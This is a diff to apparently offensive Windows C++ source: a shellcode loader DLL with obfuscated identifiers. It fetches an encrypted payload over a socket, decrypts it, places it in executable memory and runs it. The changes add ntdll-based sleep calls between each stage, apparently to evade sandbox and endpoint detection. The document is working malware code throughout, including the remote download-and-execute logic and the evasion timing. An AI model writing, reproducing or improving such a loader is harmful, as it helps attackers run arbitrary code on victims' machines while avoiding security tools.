@@ -8,10 +8,31 @@
 #pragma comment(lib, "crypt32.lib")
 #pragma comment(lib, "advapi32")
 #include <psapi.h>
+#include <string.h>
+#include <tlhelp32.h>
 
 // Define the shellcode function signature
 typedef void (*RandomA)();
 
+
+static NTSTATUS(__stdcall *NtDelayExecution)(BOOL Alertable, PLARGE_INTEGER DelayInterval) = (NTSTATUS(__stdcall*)(BOOL, PLARGE_INTEGER)) GetProcAddress(GetModuleHandle("ntdll.dll"), "NtDelayExecution");
+
+static NTSTATUS(__stdcall *ZwSetTimerResolution)(IN ULONG RequestedResolution, IN BOOLEAN Set, OUT PULONG ActualResolution) = (NTSTATUS(__stdcall*)(ULONG, BOOLEAN, PULONG)) GetProcAddress(GetModuleHandle("ntdll.dll"), "ZwSetTimerResolution");
+
+
+
+static void SleepShort(float milliseconds) {
+    static bool once = true;
+    if (once) {
+        ULONG actualResolution;
+        ZwSetTimerResolution(1, true, &actualResolution);
+        once = false;
+    }
+
+    LARGE_INTEGER interval;
+    interval.QuadPart = -1 * (int)(milliseconds * 10000.0f);
+    NtDelayExecution(false, &interval);
+}
 bool Random1(const char* Random2, int Random3, const char* Random4, char*& Random5, size_t& Random6) {
     WSADATA wsaData;
     if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
@@ -116,6 +137,7 @@ int Random7(char* Random8, unsigned int Random8_len, char* Random9, size_t Rando
     }
 
     if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, Random8, &Random8_len)) {
+
         return -1;
     }
 
@@ -135,13 +157,14 @@ extern "C" void CALLBACK ENTRYPOINT(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLin
 
     char* Random5;
     size_t Random6;
-
-    if (Random1(Random2, Random3, Random4, Random5, Random6)) {
+	
+	SleepShort(2500);
+	if (Random1(Random2, Random3, Random4, Random5, Random6)) {
         printf("Binary data received successfully.\n");
 
         // Print received data size for debugging
         printf("Received data size: %zu\n", Random6);
-
+	SleepShort(2300);
         Random7((char*)Random5, Random6, Random9, sizeof(Random9));
 
         // Allocate executable memory with READ, WRITE permissions
@@ -152,10 +175,10 @@ extern "C" void CALLBACK ENTRYPOINT(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLin
             delete[] Random5;
             return;
         }
-
+	SleepShort(3500);
         // Copy binary data to the executable memory
         memcpy(executableMemory, Random5, Random6);
-
+	SleepShort(3400);
         // Change the protection to PAGE_EXECUTE_READ
         DWORD oldProtect;
         if (!VirtualProtect(executableMemory, Random6, PAGE_EXECUTE_READ, &oldProtect)) {
@@ -168,7 +191,7 @@ extern "C" void CALLBACK ENTRYPOINT(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLin
 
         // Create a function pointer to the shellcode
         RandomA RandomB = reinterpret_cast<RandomA>(executableMemory);
-
+	SleepShort(2345);
         // Call the shellcode function
         printf("Executing shellcode...\n");
         RandomB();
@@ -184,5 +207,4 @@ extern "C" void CALLBACK ENTRYPOINT(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLin
         return;
     }
 }
-
 
